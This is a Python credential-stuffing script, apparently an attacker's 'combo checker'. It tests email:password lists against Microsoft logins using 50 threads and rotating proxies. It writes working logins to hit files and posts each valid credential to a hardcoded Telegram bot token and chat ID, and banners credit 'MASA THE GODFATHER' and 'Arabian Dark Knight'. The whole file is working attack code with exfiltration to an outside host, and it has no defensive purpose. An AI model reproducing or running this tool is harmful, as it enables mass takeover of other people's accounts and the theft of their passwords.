import random
import threading
import pyfiglet
import requests
from mailhub import MailHub
from concurrent.futures import ThreadPoolExecutor
import os
from rich.console import Console
from rich.panel import Panel

logo = pyfiglet.figlet_format('MASA THE GODFATHER ')
print(logo)

mail = MailHub()
write_lock = threading.Lock()

TELEGRAM_BOT_TOKEN = '8015416576:AAF-x4yxWwEnlGo9m17VRzvWkFVyWR2qf3Y'
TELEGRAM_CHAT_ID = '7957784778'

# متغيرات لتخزين النتائج
hits_count = 0
invalid_count = 0
console = Console()

def validate_line(line):
    parts = line.strip().split(":")
    if len(parts) == 2:
        return parts[0], parts[1]
    else:
        return None, None

def attempt_login(email, password, proxy, hits_file, local_hits_file):
    global hits_count, invalid_count
    try:
        res = mail.loginMICROSOFT(email, password, proxy)[0]
        if res == "ok":
            with write_lock:
                hits_count += 1
                console.print(f"[green]Valid   | {email}:{password}[/green]")
                hits_file.write(f"{email}:{password}\n")
                hits_file.flush()
                local_hits_file.write(f"{email}:{password}\n")
                local_hits_file.flush()
                send_to_telegram(email, password)
        else:
            with write_lock:
                invalid_count += 1
                console.print(f"[red]Invalid | {email}:{password}[/red]")
    except Exception as e:
        console.print(f"[yellow]Error logging in {email}:{password} - {str(e)}[/yellow]")

    # تحديث الشاشة
    console.clear()
    console.print(Panel(f"Hits: {hits_count}  Invalid: {invalid_count}", title="Results"))

def send_to_telegram(email, password):
    message = f""" 
Arabian Dark Knight  { @ArabianDarkKnight - @DarkKnightArabian }


Valid Acc : {email}:{password}
    """
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    payload = {
        'chat_id': TELEGRAM_CHAT_ID,
        'text': message
    }
    try:
        response = requests.post(url, data=payload)
        if response.status_code == 200:
            console.print("[green]Successfully sent to Telegram![/green]")
        else:
            console.print(f"[red]Failed to send to Telegram. Status code: {response.status_code}[/red]")
    except Exception as e:
        console.print(f"[yellow]An error occurred while sending to Telegram: {e}[/yellow]")

def process_combo_file(hits_file, local_hits_file, proxies, combo_path):
    try:
        with open(combo_path, "r") as file:
            with ThreadPoolExecutor(max_workers=50) as executor:
                futures = []
                for line in file:
                    email, password = validate_line(line)
                    if email is None or password is None:
                        console.print(f"[red]Invalid format in line: {line.strip()}[/red]")
                        continue
                    proxy = {"http": f"http://{random.choice(proxies).strip()}"} if proxies else None
                    futures.append(executor.submit(attempt_login, email, password, proxy, hits_file, local_hits_file))
                for future in futures:
                    future.result()
    except Exception as e:
        console.print(f"[red]Error processing combo file: {e}[/red]")

def main():
    combo_path = input("Enter the path to the combo file: ")
    proxy_path = input("Enter the path to the proxy file (or press Enter to skip): ")

    if not os.path.exists(combo_path):
        console.print("[red]Combo file does not exist.[/red]")
        return

    proxies = []
    if proxy_path:
        if not os.path.exists(proxy_path):
            console.print("[red]Proxy file does not exist.[/red]")
            return
        with open(proxy_path, "r") as proxy_file:
            proxies = proxy_file.readlines()

    with open("masa_hits.txt", "a", encoding="utf-8") as local_hits_file:
        with open("temp_hits.txt", "w", encoding="utf-8") as temp_file:
            console.print("[blue]Starting login attempts...[/blue]")
            process_combo_file(temp_file, local_hits_file, proxies, combo_path)
            console.print("[blue]Login attempts finished.[/blue]")

if __name__ == "__main__":
    main()

